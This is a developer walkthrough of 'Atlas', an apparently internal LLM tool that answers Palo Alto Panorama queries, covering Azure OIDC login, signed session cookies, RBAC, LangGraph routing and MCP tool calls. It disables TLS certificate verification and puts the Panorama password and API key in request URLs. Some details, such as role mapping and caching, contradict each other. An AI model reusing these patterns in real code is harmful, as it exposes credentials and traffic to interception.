# Panorama Query — End-to-End Flow

This document traces the complete lifecycle of a Panorama query through Atlas, from the moment a user types a message in the browser to the rendered response. Atlas supports two distinct query paths depending on intent:

- **Direct MCP path (`network` intent)** — group lookups, member listings, unused object queries. Detailed step-by-step trace in Steps 0–11 below.
- **A2A multi-agent path (`netbrain` intent)** — path queries with Panorama firewall enrichment ("find path from 10.0.0.1 to 10.0.1.1"). Covered in the [NetBrain Path Query](#netbrain-path-query-netbrain-intent) section.

---

## Architecture Overview

Atlas uses **LangGraph** to route queries through a graph of nodes. The path a Panorama query takes depends on intent classification:

```
Browser (React + Zustand)
    │  POST /api/discover  (tool pre-selection, UX only)
    │  POST /api/chat      (full query)
    ▼
FastAPI (app.py)
    │  Session cookie validation (auth.py)
    │  RBAC check (auth.py)
    ▼
chat_service.py → atlas_graph (LangGraph)
    │
    ├── intent: "network"  ──────────────────────────────────────────────┐
    │   (e.g. "what group is 11.0.0.1 in?")                             │
    │   fetch_mcp_tools → tool_selector → check_rbac → tool_executor    │
    │       └── MCP Server → panorama_tools.py → Panorama API           │
    │                                                                    ▼
    ├── intent: "risk"                                        build_final_response
    │   (e.g. "is 11.0.0.1 suspicious?")                         │
    │   risk_orchestrator                                         ▼
    │       ├── Panorama agent (port 8003)                  FastAPI → JSON → React
    │       │       └── agent_loop.py (tool-calling loop)
    │       │           └── panorama_tools via MCP
    │       └── Splunk agent (port 8002)
    │               └── agent_loop.py (tool-calling loop)
    │                   └── splunk_tools via MCP
    │       └── Ollama synthesis (risk_synthesis.md skill)
    │
    └── intent: "netbrain"
        (e.g. "find path from 10.0.0.1 to 10.0.1.1")
        netbrain_agent (port 8004)
            └── agent_loop.py (tool-calling loop)
                ├── netbrain_query_path (MCP)
                └── ask_panorama_agent (A2A → port 8003)
```

---

## Intent Classification

**File:** [`graph_nodes.py`](../../graph_nodes.py) — `classify_intent()`

Every query enters the LangGraph at `classify_intent`. The node inspects the prompt and returns one of several intents:

| Condition | Intent | Route |
|---|---|---|
| One IP + risk keywords (suspicious, threat, etc.) | `risk` | `risk_orchestrator` |
| Two IPs, or path keywords (path, route, trace, hops) | `netbrain` | `netbrain_agent` |
| Documentation question | `doc` | `doc_tool_caller` |
| Everything else | `network` | `fetch_mcp_tools` → tool selector |

Panorama queries like "what group is 11.0.0.1 in?" or "show unused address objects" fall through to `network`.

---

## Skills System

Skills are Markdown files in [`skills/`](../../skills/) loaded as system prompts. Each agent or LLM call has its own skill file:

| File | Loaded by | Purpose |
|---|---|---|
| `skills/base.md` | Main LangGraph (all queries) | Role statement + short-reply context hint |
| `skills/panorama_agent.md` | Panorama agent | Panorama domain knowledge (concepts, terminology, zones) |
| `skills/splunk_agent.md` | Splunk agent | Splunk domain knowledge (deny events, risk signals) |
| `skills/netbrain_agent.md` | NetBrain agent | Path query concepts, Panorama enrichment instructions |
| `skills/risk_synthesis.md` | Risk orchestrator synthesis | Output format + risk signal guidance |

**Design principle:** skills contain only domain knowledge. Tool selection logic lives in tool docstrings (`@mcp.tool()` descriptions). Sequential chaining logic lives in code (`tool_executor` deterministic chaining, `agent_loop.py`).

### Skills vs MCP tool docstrings

These two mechanisms are complementary and answer different questions:

**MCP tool docstring** — scoped to one tool, answers: "should I call this tool, and with what arguments?"

```python
@mcp.tool()
async def query_panorama_ip_object_group(ip_address: str) -> dict:
    """
    Find which Panorama address groups contain a given IP address.

    Use for: queries with an IP address asking which group it belongs to.
    Do NOT use for: device names (have dashes).

    Examples:
    - "what address group is 10.0.0.1 in?" → ip_address="10.0.0.1"
    """
```

The LLM sees all tool docstrings side-by-side and uses them to pick the right tool and extract the right arguments. This is selection logic, not background knowledge.

**Skill** — loaded as the system prompt, answers: "what domain am I working in and what do terms mean?"

```markdown
# skills/panorama_agent.md
You are working with Palo Alto Panorama — a centralized firewall management platform.

CONCEPTS:
- Address object: a named IP, range, or CIDR
- Address group: a named collection of address objects
- Device group: a set of firewalls managed together
- Security zone: trust, untrust, dmz
```

No tool selection here — just background knowledge that makes tool outputs interpretable and responses accurate.

| Question | Where it lives |
|---|---|
| Should I call this tool? | Docstring (`Use for / Do NOT use for`) |
| What arguments do I pass? | Docstring (`Examples`) |
| What does "address group" mean? | Skill |
| What's the difference between a zone and a device group? | Skill |
| What format should my response be in? | Skill (`risk_synthesis.md`) |

---

## Path 1: Direct MCP Query (network intent)

The steps below trace the full lifecycle of a direct Panorama query — "What address group is 11.0.0.1 part of?" — from browser to rendered response.

---

## Step 0: Authentication (One-Time Login)

**File:** [app.py](../../app.py), [auth.py](../../auth.py)

Before a user can type any query, they must be authenticated. This happens once per session — not on every query.

### 1. User visits Atlas — no session cookie

The user opens Atlas in the browser. FastAPI checks every incoming request for a valid `atlas_session` cookie. If none exists (first visit, or cookie expired), the request is rejected with a `302` redirect to `/login`.

### 2. User clicks "Sign in with Microsoft" → `GET /auth/microsoft`

The login page renders a link:

The user clicks "Sign in with Microsoft" on the login page. The browser hits `GET /auth/microsoft` ([app.py](../../app.py)), which builds a redirect URL to Azure's login page and sends the browser there. Atlas is not involved in credential checking — that all happens on Azure's side.

Atlas generates a random `state` value and stores it temporarily. Azure will echo it back in the callback so Atlas can verify the response wasn't forged by a third party. See [FAQ: What is the state parameter / CSRF token?](#what-is-the-state-parameter--csrf-token).

### 3. User authenticates on Azure's login page

The browser is now on Azure's login page (`login.microsoftonline.com`). The user enters their credentials and completes MFA if required. Atlas is not involved at this point.

### 4. Azure redirects the browser back to Atlas

After successful authentication, Azure redirects the browser to the `redirect_uri` that was included in the authorization URL:

```
GET http://localhost:8000/auth/callback?code=<auth-code>&state=<csrf-token>
```

`code` is a short-lived, single-use authorization code — not a token. It proves authentication succeeded but cannot be used to access anything on its own. It expires in seconds and is useless without the app's `client_secret`.

### 5. Atlas exchanges the code for tokens → `GET /auth/callback`

The browser hits Atlas's callback route ([app.py:178](../../app.py#L178)):

```python
# app.py:178-200
@app.get("/auth/callback")
async def auth_callback(request: Request):
    ...
    try:
        token = await oauth.microsoft.authorize_access_token(request)
    except Exception as exc:
        print(f"OIDC token error: {exc}", flush=True)
        return RedirectResponse(url="/login?error=oidc", status_code=302)
```

`authorize_access_token()` is a single authlib call that does two things internally:

1. **CSRF check** — reads `state` from the callback URL query params and compares it to the value stored in the Starlette session cookie from step 2. Raises an exception if they don't match.
2. **Token exchange** — makes a server-to-server POST to Azure's token endpoint:

```
POST https://login.microsoftonline.com/{tenant_id}/v2.0/token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code
&code=<auth-code-from-url>
&redirect_uri=http://localhost:8000/auth/callback
&client_id=<AZURE_CLIENT_ID>
&client_secret=<AZURE_CLIENT_SECRET>
```

This exchange never goes through the browser — the tokens never appear in the URL bar, history, or logs. Azure verifies the code and secret, then returns `id_token`, `access_token`, and `refresh_token` as a JSON response which authlib parses into `token`.

This two-step design — code in the URL, tokens exchanged privately — is the core security property of the **OAuth 2.0 Authorization Code Flow**.

### 6. Atlas decodes the `id_token` JWT to extract user claims

```python
id_token = token.get("id_token")
payload = id_token.split(".")[1]
payload += "=" * (4 - len(payload) % 4)   # restore base64 padding
userinfo = json.loads(base64.urlsafe_b64decode(payload))
```

A JWT has three segments separated by `.` — header, payload, signature — each base64url-encoded. Atlas splits on `.`, takes the middle segment (the payload), restores the padding that JWT omits, and decodes it to a JSON dict. The signature was already verified by `authorize_access_token()`, so Atlas only needs the claims dict.

The `groups` claim is extracted from this dict — it contains the Azure AD group Object IDs the user belongs to. Microsoft does not include group memberships in the `/userinfo` endpoint, which is why Atlas decodes the `id_token` directly rather than using authlib's built-in userinfo fetch.

### 7. Role resolution

```python
group = extract_group_from_token(userinfo)
if group is None:
    return RedirectResponse(url="/login?error=norole", status_code=302)
```

`extract_group_from_token()` in [auth.py](../../auth.py) matches the group GUIDs from the `groups` claim against `ROLE_ALLOWED_TOOLS` — a dict mapping known group IDs to roles. If the user is not in any recognised group, login is rejected with `?error=norole`.

### 8. Signed session cookie is created and set

```python
session_id = create_session(username, group=group, auth_mode="oidc", tokens={...})

r = RedirectResponse(url="/", status_code=302)
r.set_cookie(key="atlas_session", value=session_id, max_age=1800, httponly=True, samesite="lax")
return r
```

`create_session()` uses `itsdangerous.URLSafeTimedSerializer` to sign `{username, group, auth_mode, tokens}` into a tamper-proof string using `SESSION_SECRET` from `.env`. The cookie is:

- `HttpOnly` — the browser refuses to expose this cookie to JavaScript (`document.cookie` returns nothing for it). Even if an attacker injects a `<script>` tag via XSS, they cannot read or exfiltrate the session token. The cookie travels only in HTTP headers, which your JS code never sees.
- `SameSite=Lax` — controls when the browser attaches the cookie to cross-site requests:
  - **Sent** on top-level navigations initiated by the user (e.g. clicking a link to Atlas from another site) — needed so the OIDC redirect back from Azure still carries the session.
  - **Blocked** on cross-site subrequests (e.g. an `<img>`, `<form>`, or `fetch()` embedded in a third-party page trying to silently hit `/api/chat` on your behalf). This stops CSRF: a malicious page cannot trigger authenticated Atlas API calls just because your browser holds the cookie.
  - `SameSite=Strict` would be even tighter (block even top-level cross-site navigations) but would break the Azure OIDC redirect flow.
- `max_age=1800` — 30-minute TTL baked into the signature; `loads()` rejects it after expiry

### 9. Browser is redirected to `/` — user is now authenticated

The browser follows the `302` to `/`, now carrying the `atlas_session` cookie. From this point on, every request to `/api/discover` and `/api/chat` includes the cookie automatically — the per-request validation is described in [Step 3](#step-3-session--rbac-check-fastapi).

For full detail on the OIDC login flow and token handling see [auth-rbac.md](../Security/auth-rbac.md).

---

## Step 1: User Types a Query (Frontend)

**File:** [frontend/src/components/chat/ChatInput.jsx](../../frontend/src/components/chat/ChatInput.jsx)
**File:** [frontend/src/stores/chatStore.js](../../frontend/src/stores/chatStore.js)

The user types `"What address group is 11.0.0.1 part of?"` and presses Enter. The input box clears and two HTTP requests fire simultaneously — `/api/discover` and `/api/chat` — both carrying the same body:

```json
{ "message": "What address group is 11.0.0.1 part of?", "conversation_history": [] }
```

`conversation_history` is always empty — each query is stateless. Prior conversation context is not sent to the LLM to prevent earlier exchanges from polluting unrelated queries.

---

## Step 2: Tool Pre-selection (`/api/discover`)

**File:** [frontend/src/utils/api.js](../../frontend/src/utils/api.js) → `discoverTool()`

```
POST /api/discover
Content-Type: application/json
Cookie: atlas_session=<signed-cookie>

{ "message": "What address group is 11.0.0.1 part of?", "conversation_history": [] }
```

`/api/discover` exists purely for UI feedback. It runs a full LLM call to identify which tool will be used and returns quickly — before any backend system is contacted:

```json
{ "tool_name": "query_panorama_ip_object_group", "tool_display_name": "Panorama", "intent": "network" }
```

The UI uses `tool_display_name` to update the loading indicator from `"Identifying query"` to `"Querying Panorama"`. If this call fails, the label falls back to `"Processing"` — `/api/chat` continues regardless.

> **Note:** The tool selection `/api/discover` performs is repeated from scratch by `/api/chat`. This is intentional — discover is fire-and-forget for UX only. The cost is one redundant LLM call per query.

The `atlas_session` cookie is sent automatically by the browser on every request. It identifies the user and drives RBAC. If it is missing or expired, FastAPI returns a `401` and the browser redirects to `/login`. See [FAQ](#faq).

---

## Step 3: Session & RBAC Check (FastAPI)

**File:** [app.py](../../app.py), [auth.py](../../auth.py)

### Session validation

```python
# app.py
def get_current_username(request: Request) -> str | None:
    sid = request.cookies.get("atlas_session")
    return get_username_for_session(sid)
```

`get_username_for_session` calls `get_session(sid)` ([auth.py:137](../../auth.py#L137)) which uses `itsdangerous.URLSafeTimedSerializer` to verify the cookie and decode its payload.

#### What is itsdangerous.URLSafeTimedSerializer?

`itsdangerous` is a Python library for signing data so it cannot be tampered with. `URLSafeTimedSerializer` specifically:

- **Signs** the session payload with an HMAC using `SESSION_SECRET` (from `.env`) and a `salt` (`"atlas-session"`) as the key. The salt scopes the serializer — a cookie signed for Atlas cannot be replayed against another app that shares the same secret.

  > **What is a salt?** A salt is an extra fixed string mixed into the HMAC computation to change its output — even when the secret key is the same. Its purpose here is **scoping**: it ensures a signed value created in one context cannot be replayed in another. For example, if Atlas used the same `SESSION_SECRET` for both session cookies and password-reset links, the two serializers would produce completely different signatures because they have different salts (`"atlas-session"` vs. `"password-reset"`), so a stolen session cookie could not be used as a reset token. The salt is **not secret** — it is a fixed string in the code. All security comes from `SESSION_SECRET`. The salt just ensures the same secret produces different signatures in different contexts.
- **Serialises** the payload to a URL-safe base64 string (no `+`, `/`, or `=` characters). Serialisation means converting a Python object (a dict like `{"username": "alice", "group": "netadmin", ...}`) into a flat string that can be transmitted or stored — in this case, as a cookie value. The dict cannot be stored directly in a cookie; it must first be encoded into a string. `URLSafeTimedSerializer` encodes it as base64url, which uses only characters safe for URLs and cookie values (`A-Z`, `a-z`, `0-9`, `-`, `_`) — no `+`, `/`, or `=` which would require percent-encoding in a URL.
- **Embeds a timestamp** in the signed output, enabling time-limited verification.

```python
# auth.py:61
_session_serializer = URLSafeTimedSerializer(_SESSION_SECRET, salt="atlas-session")

# Signing (at login):
session_id = _session_serializer.dumps({"username": ..., "group": ..., ...})

# Verifying (on every request):
payload = _session_serializer.loads(session_id, max_age=1800)  # max_age = 30 min TTL
```

`loads()` is called inside `get_session()` in [auth.py:142](../../auth.py#L142), which is called by `get_username_for_session()`, which is called by `get_current_username()` in `app.py` on every incoming request:

```python
# auth.py:137
def get_session(session_id: Optional[str]) -> Optional[dict]:
    try:
        payload = _session_serializer.loads(session_id, max_age=OIDC_SESSION_TTL)
        if isinstance(payload, dict):
            return payload
    except (BadSignature, Exception):
        pass
    return None
```

`loads()` does three things atomically in a single call:
1. **Verifies the HMAC signature** — if the cookie value was modified in any way, this raises `BadSignature` and `get_session()` returns `None`.
2. **Checks the embedded timestamp** — if more than `max_age=1800` seconds have elapsed since signing, it raises `SignatureExpired` and `get_session()` returns `None`.
3. **Deserialises the payload** — if both checks pass, returns the original dict `{username, group, auth_mode, created_at}`.

There is no server-side session store — the cookie payload IS the session. This means sessions survive app restarts and work across multiple app instances, as long as `SESSION_SECRET` is the same on all instances. If `SESSION_SECRET` is not set in `.env`, a random secret is generated per process ([auth.py:58](../../auth.py#L58)), invalidating all existing sessions on every restart.

If the cookie is missing, invalid, or expired → 401 + `{"redirect": "/login"}`.

### RBAC check

The RBAC check for Panorama tools happens later inside `chat_service.process_message()`, but the role is resolved from the session here:

```python
# auth.py
ROLE_ALLOWED_TOOLS = {
    "admin":    None,                                    # all tools
    "netadmin": {"query_network_path", "check_path_allowed",
                 "query_panorama_ip_object_group",
                 "query_panorama_address_group_members"},
    "guest":    set(),                                   # no tools
}
```

Both Panorama tools are accessible to `admin` and `netadmin` roles. `guest` is denied.

### How roles are assigned (OIDC login flow)

When a user logs in via Microsoft (`GET /auth/microsoft` → Microsoft login page → `GET /auth/callback`):

1. Atlas redirects the browser to `https://login.microsoftonline.com/{tenant_id}/v2.0/authorize`. Azure handles all credential verification (password, MFA) — Atlas never sees the password. Azure redirects back to `/auth/callback` with a short-lived one-time **authorization code** — a single-use opaque string that proves authentication succeeded. It expires in seconds, is useless without the app's `client_secret`, and cannot itself be used to access any resources.

2. `authlib` makes a **server-to-server POST** to Azure's token endpoint, exchanging the code (plus the app's `client_secret`) for the actual tokens. This exchange never goes through the browser — tokens never appear in the URL bar, browser history, or referrer headers. Azure responds with three tokens:

   - **`id_token`** — a JWT containing identity claims about the user (`email`, `name`, `groups`, etc.). This is what Atlas reads to identify who logged in and which group they belong to. It is consumed once at login time and not stored. **Code:** [app.py:208–214](../../app.py#L208-L214) — the JWT payload segment is base64-decoded manually to extract claims.

   - **`access_token`** — a JWT that authorizes calls to Microsoft APIs (e.g. Microsoft Graph) on behalf of the user. Atlas does not call any Microsoft APIs after login, so this token is received but not used. **Code:** [app.py:237](../../app.py#L237) — passed into `create_session(tokens={...})` and silently dropped there.

   - **`refresh_token`** — an opaque long-lived token that can be used to obtain new `access_token`s without re-prompting the user. Atlas does not implement token refresh — sessions expire after 30 minutes and the user must log in again. This token is also received but not used. **Code:** [app.py:238](../../app.py#L238) — same as `access_token`, passed in and dropped.

   All three tokens are passed to `create_session()` in [auth.py:115–134](../../auth.py#L115-L134), but that function intentionally discards them — the docstring states: *"tokens is accepted for interface compatibility but is intentionally not stored — OAuth tokens are too large for a cookie and are not needed after the group is resolved at sign-in."* Only `{ username, group, auth_mode, created_at }` is baked into the cookie.

   > **What is a JWT?** A JSON Web Token is a string of three base64url-encoded segments separated by dots: `header.payload.signature`. The **payload** is a plain JSON object containing claims (`"email"`, `"groups"`, etc.) — readable by anyone, but not encrypted. The **signature** is a cryptographic hash signed with Azure's private key — it proves the token came from Azure and has not been tampered with. authlib verifies the signature against Azure's public keys before Atlas reads any claims.

3. Atlas manually decodes the `id_token` JWT payload to extract the `groups` claim. The `groups` claim is a Microsoft extension that only appears in the `id_token` — it is never returned by the standard `/userinfo` endpoint.

4. `extract_group_from_token()` in [auth.py](../../auth.py) iterates the `groups` claim and matches each value directly against the keys of `GROUP_ALLOWED_TOOLS` (e.g. `"admin"`, `"netadmin"`). This works because on-prem synced groups emit the `sAMAccountName` in the token — the group name is the same string Atlas uses internally, so no mapping is needed. If no group matches → 302 redirect to `/login?error=norole`.

5. A signed session cookie is set (`atlas_session`, `HttpOnly`, `SameSite=Lax`, 30 min TTL) containing `{ username, group, auth_mode, created_at }`. No PIM, no app roles — auth is entirely group-based.

For full detail on the login flow see [auth-rbac.md](../Security/auth-rbac.md).

---

## Step 4: FastAPI Routes to chat_service

**File:** [app.py](../../app.py)

There are two routes involved — one per request sent by the frontend.

### `/api/discover` route

```python
@app.post("/api/discover")
async def api_discover(request: Request, body: ChatRequest):
    username = get_current_username(request)   # reads + verifies the session cookie
    if not username:
        return response_401_clear_session(request)
    result = await process_message(
        body.message.strip(),                  # "What address group is 11.0.0.1 part of?"
        body.conversation_history or [],       # [] — always empty from frontend
        discover_only=True,                    # tells process_message to stop after tool selection
        username=username,                     # for conversation history persistence
        session_id=get_session_id(request),   # raw cookie value — needed for RBAC group lookup
    )
    return result
```

### `/api/chat` route

```python
@app.post("/api/chat")
async def api_chat(request: Request, body: ChatRequest):
    username = get_current_username(request)
    if not username:
        return response_401_clear_session(request)
    result = await process_message(
        body.message.strip(),
        body.conversation_history or [],
        discover_only=False,                   # default — runs the full pipeline including tool execution
        username=username,
        session_id=get_session_id(request),
    )
    return result
```

The two routes are identical except for `discover_only`. Both call the same `process_message()` function in `chat_service.py`.

### Why session_id is passed separately from username

`username` is extracted from the cookie and passed to `process_message()` for two purposes: **conversation history persistence** (conversations are stored on disk keyed by username — `create_conversation(APP_DIR, username, ...)`, `append_to_conversation(APP_DIR, username, ...)`) and as a **fallback identifier** for `_check_tool_access()` if `session_id` is unavailable. `session_id` is the raw cookie string — it's passed separately so `chat_service.py` can call `get_group_for_session(session_id)` to look up the user's group for RBAC enforcement. The group is not stored in the username; it lives in the session payload.

### Request body validation — ChatRequest

FastAPI automatically deserializes and validates the JSON body using the `ChatRequest` Pydantic model before the route function runs:

```python
class ChatRequest(BaseModel):
    message: str                                    # required — the user's query text
    conversation_history: list[dict[str, Any]] = [] # optional — always [] from the frontend
    conversation_id: str | None = None              # optional — used for history persistence
    parent_conversation_id: str | None = None       # optional — links follow-up conversations
```

If `message` is missing or not a string, FastAPI returns `422 Unprocessable Entity` before the route function is even called. `body.message.strip()` removes leading/trailing whitespace before passing to `process_message()`.

---

## Step 5: Tool Discovery in chat_service

**File:** [chat_service.py](../../chat_service.py)

### Fetching MCP tool schemas

```python
mcp_tools = await _fetch_mcp_tools()
```

`_fetch_mcp_tools()` connects to the MCP server at `http://127.0.0.1:8765` using the MCP streamable-http transport and calls `list_tools()`. The result is cached for the process lifetime (reset on restart). Each tool's schema includes its name, docstring-derived description, and JSON Schema for parameters.

### Where tool descriptions come from

The description string the LLM sees — `"Find which Panorama address groups contain a given IP address. Use for: ..."` — originates from the **docstring of the `@mcp.tool()`-decorated function** in [tools/panorama_tools.py](../../tools/panorama_tools.py):

```python
# tools/panorama_tools.py (around line 644)
@mcp.tool()
async def query_panorama_ip_object_group(
    ip_address: str,
    device_group: str = "",
    vsys: str = "vsys1",
) -> Dict[str, Any]:
    """
    Find which Panorama address groups contain a given IP address.

    Use for: queries with an IP address (has dots, e.g. "10.0.0.1") asking which address group/object group it belongs to.
    Do NOT use for: device names (have dashes, use get_device_rack_location), ...

    Examples:
    - "what address group is 10.0.0.1 in?" → ip_address='10.0.0.1'
    ...
    """
```

The `@mcp.tool()` decorator (from FastMCP) registers the function with the MCP server and uses the docstring as the tool's description. When `chat_service.py` calls `list_tools()` on the MCP server, the server returns each tool's name, JSON Schema for parameters, and this description string. To change what the LLM sees as the tool's purpose or usage guidance, edit the docstring directly in `panorama_tools.py`.

### Where the JSON Schema for parameters comes from

The parameter schema is **not written manually** — FastMCP generates it automatically from the **Python type annotations** on the function signature at registration time:

```python
# tools/panorama_tools.py:638
async def query_panorama_ip_object_group(
    ip_address: str,              # → required string parameter
    device_group: Optional[str] = None,  # → optional string, defaults to None
    vsys: str = "vsys1"           # → optional string, defaults to "vsys1"
) -> Dict[str, Any]:
```

FastMCP introspects these annotations and produces the JSON Schema that `list_tools()` returns:

```json
{
  "name": "query_panorama_ip_object_group",
  "inputSchema": {
    "type": "object",
    "properties": {
      "ip_address":   {"type": "string"},
      "device_group": {"type": "string"},
      "vsys":         {"type": "string", "default": "vsys1"}
    },
    "required": ["ip_address"]
  }
}
```

This schema is what the LLM uses to know which arguments to extract from the user's query and what types they must be. To add, remove, or rename a parameter — or change whether it is required — edit the **function signature type annotations** in `panorama_tools.py`. No separate schema file exists.

---

### Building tool descriptions for the LLM

> **Why is it called `_to_openai_tool`?**
> The name refers to the output format, not the provider. OpenAI introduced the function-calling JSON schema (`{"type": "function", "function": {"name": ..., "description": ..., "parameters": ...}}`), which has since become the de facto standard adopted by LangChain's `bind_tools()`. Even though Atlas uses Ollama/Llama as the LLM, LangChain still expects tools in this OpenAI-compatible format.

```python
def _to_openai_tool(t) -> dict:
    # Strips everything from "Args:" onward, keeps up to 600 chars
    # This preserves "Use for / Do NOT use for / Examples" sections
    if desc:
        args_idx = desc.find("\n    Args:")
        if args_idx > 0:
            desc = desc[:args_idx].strip()
        desc = desc[:600]
    return {"type": "function", "function": {"name": name, "description": desc, "parameters": schema}}
```

The description passed to the LLM for `query_panorama_ip_object_group` includes:

```
Find which Panorama address groups contain a given IP address.

Use for: queries with an IP address (has dots, e.g. "10.0.0.1") asking which address group/object group it belongs to.
Do NOT use for: device names (have dashes, use get_device_rack_location), ...

Examples:
- "what address group is 10.0.0.1 in?" → ip_address="10.0.0.1"
...
```

This rich context guides the LLM to select the correct tool.

### LLM tool selection (LangChain + Ollama)

**File:** [chat_service.py](../../chat_service.py) → `process_message()` (lines ~345–410)

```python
# chat_service.py
from langchain_ollama import ChatOllama
from tools.shared import OLLAMA_MODEL, OLLAMA_BASE_URL  # read from .env

# OLLAMA_MODEL and OLLAMA_BASE_URL are read from .env via tools/shared.py.
# "llama3.1:8b" and "http://localhost:11434" are the fallback defaults only.
llm = ChatOllama(model=OLLAMA_MODEL, base_url=OLLAMA_BASE_URL, temperature=0.0)
llm_with_tools = llm.bind_tools(openai_tools, tool_choice="required")
messages = _build_llm_messages(prompt, conversation_history)
ai_msg = await asyncio.wait_for(llm_with_tools.ainvoke(messages), timeout=90.0)
```

**System prompt** tells the LLM:
- Always call a tool — never answer from memory.
- IP addresses → `query_panorama_ip_object_group` or `get_splunk_recent_denies`.
- Address group names → `query_panorama_address_group_members`.

`tool_choice="required"` forces the LLM to always output a structured tool call rather than a text response.

The LLM responds with a structured `tool_calls` entry:
```json
{
  "name": "query_panorama_ip_object_group",
  "args": { "ip_address": "11.0.0.1" }
}
```

### RBAC enforcement (before tool execution)

```python
def _check_tool_access(username, tool_name, session_id):
    role = get_role_for_session(session_id)
    allowed = get_allowed_tools(role)
    if allowed is not None and tool_name not in allowed:
        return f"Your role ({role}) does not have access to Panorama queries."
    return None
```

If the user's role forbids the tool, an error message is returned immediately — the tool is never called.

### discover_only mode

When called from `/api/discover`, the function returns immediately after tool selection:

```python
if discover_only:
    return {
        "tool_name": "query_panorama_ip_object_group",
        "parameters": {"ip_address": "11.0.0.1"},
        "tool_display_name": "Panorama",
        "format": "table",
    }
```

---

## Step 6: Full Chat Request (Frontend → FastAPI)

After discovery, the frontend fires the actual chat request:

```
POST /api/chat
{ "message": "What address group is 11.0.0.1 part of?", "conversation_history": [] }
```

`process_message()` runs again from scratch (not reusing the discover result), this time with `discover_only=False`. The LLM is invoked again, makes the same tool selection, and proceeds to execution.

---

## Step 7: MCP Tool Execution

**File:** [chat_service.py](../../chat_service.py) → `call_mcp_tool()`
**File:** [mcp_client.py](../../mcp_client.py)

```python
result = await call_mcp_tool(
    "query_panorama_ip_object_group",
    {"ip_address": "11.0.0.1"},
    timeout=65.0
)
```

The MCP client sends a JSON-RPC `tools/call` message over the streamable-http transport to `http://127.0.0.1:8765`. The MCP server (running as a separate process) receives it and dispatches to the registered `@mcp.tool()` handler.

---

## Step 8: panorama_tools.py — Tool Execution

**File:** [tools/panorama_tools.py](../../tools/panorama_tools.py)

### Panorama API key retrieval (panoramaauth.py)

**File:** [panoramaauth.py](../../panoramaauth.py)

```python
api_key = await panoramaauth.get_api_key()
```

`get_api_key()` always requests a fresh key — no caching. On every call it:

1. Loads `PANORAMA_USERNAME` and `PANORAMA_PASSWORD` exclusively from **Azure Key Vault** using `DefaultAzureCredential`:
   ```python
   from azure.identity import DefaultAzureCredential
   from azure.keyvault.secrets import SecretClient
   _client = SecretClient(vault_url=AZURE_KEYVAULT_URL, credential=_cred)
   PANORAMA_USERNAME = _client.get_secret("PANORAMA-USERNAME").value
   PANORAMA_PASSWORD = _client.get_secret("PANORAMA-PASSWORD").value
   ```
   If `AZURE_KEYVAULT_URL` is not set, credentials are unavailable and authentication fails.

2. Calls the Panorama XML API keygen endpoint:
   ```
   GET https://192.168.15.247/api/?type=keygen&user=<user>&password=<encoded>
   ```
   SSL certificate verification is disabled (`ssl.CERT_NONE`) because Panorama uses a self-signed certificate.
   > **Production note:** `PANORAMA_VERIFY_SSL=false` should be validated before production deployment. If Panorama has a valid CA-signed certificate, remove the SSL bypass (`ssl.CERT_NONE` / `check_hostname=False`) in `panoramaauth.py` and set `PANORAMA_VERIFY_SSL=true` in `.env`.

3. Parses the XML response:
   ```xml
   <response status="success"><result><key>LUFRPT14...</key></result></response>
   ```
   Extracts the key from the XML and returns it directly — no caching.

---

### Caching and parallel processing

To avoid hammering the Panorama appliance on every query, the toolbox includes two layers of caching plus concurrent fetches.

#### Device‑group / address‑object cache
`panorama_tools._get_address_objects_cached()` and `_get_address_groups_for_location()` each maintain an in‑memory cache keyed by location (e.g. `"device-group:my-dg"` or `"shared"`).

```python
now = _time.monotonic()
cached = _addr_obj_cache.get(key)
if cached and (now - cached[1]) < _CACHE_TTL:
    logger.debug("Address objects: cache hit for %s (%d objects)", key, len(cached[0]))
    return cached[0]
# fetch from Panorama and on success store:
_addr_obj_cache[key] = (objects, now)
```

- TTL is five minutes (`_CACHE_TTL`).
- After a cache miss the first query pays the HTTP cost; subsequent requests serve the cached value until expiry.
- If Panorama credentials expire the code clears both the API key cache and the location cache to force a re‑auth on the next request.
- Cache entries do **not** auto‑refresh; they only update when a fetch is performed. Manual invalidation requires restarting the MCP server.

Log messages at DEBUG level indicate hits/misses and object counts:
```
Device groups: cache hit (2 groups)
Address objects: fetched 6001 from device-group:my-dg
```

#### API key
A fresh API key is fetched from Panorama's `keygen` endpoint on every tool invocation — no caching. This ensures a stale or expired key is never reused.

#### Parallel HTTP requests
Once the list of locations (shared + device groups) is determined, requests for objects/groups are dispatched concurrently with `asyncio.gather()`: this turns an N‑round‑trip operation into a single parallel batch.

```python
addr_obj_results = await asyncio.gather(
    *[_get_address_objects_cached(session, panorama_url, api_key, ssl_context, lt, ln)
      for lt, ln in locations],
    return_exceptions=True,
)
```

The same pattern appears later when fetching address groups. `return_exceptions=True` ensures a failure on one location doesn’t abort the whole query; errors are logged and skipped.

| Phase | Before | After |
|-------|--------|-------|
| DG list | 1 HTTP call | cached (0–1) |
| Objects | serial N calls | N parallel + cache |
| Groups | serial N calls | N parallel |

On a warm cache with two groups, a typical IP lookup now needs **2–4 total HTTP calls** instead of 20+.  

These optimizations are what keep Panorama queries snappy even when the configuration contains thousands of address objects.

---

### API retrieval details

Every interaction with Panorama is a simple GET to the device’s `/api/` endpoint. URLs are built dynamically using the configured `PANORAMA_URL`, the current API key, and a URL‑quoted XPath expression. For example, to fetch address objects from a device group:

```python
xpath = (
    f"/config/devices/entry[@name='localhost.localdomain']"
    f"/device-group/entry[@name='{location_name}']/address"
)
url = (
    f"{panorama_url}/api/?type=config&action=get"
    f"&xpath={urllib.parse.quote(xpath)}&key={api_key}"
)
async with session.get(url, ssl=ssl_context,
                       timeout=aiohttp.ClientTimeout(total=45)) as resp:
    resp_text = await resp.text()
    # xml parsing follows here…
```

The client uses `aiohttp` with a 45‑second timeout and an SSL context constructed from `PANORAMA_VERIFY_SSL`. The raw XML response is parsed with `xml.etree.ElementTree` and inspected for `status="success"` before further processing.


### IP validation

```python
query_ip = ipaddress.ip_address("11.0.0.1")   # validates format
```

CIDR notation is also supported: `ipaddress.ip_network(ip, strict=False)`.

### Step 8a: Discover device groups to search

When no `device_group` is specified, the tool searches **shared** objects and **all device groups**:

```
GET /api/?type=config&action=get
    &xpath=/config/devices/entry[@name='localhost.localdomain']/device-group/entry
    &key=<api_key>
```

Returns XML listing all device group names configured in Panorama.

### Step 8b: Find address objects containing the IP

For each location (shared + each device group):

```
GET /api/?type=config&action=get
    &xpath=/config/devices/entry[@name='localhost.localdomain']/device-group/entry[@name='<dg-name>']/address
    &key=<api_key>
```

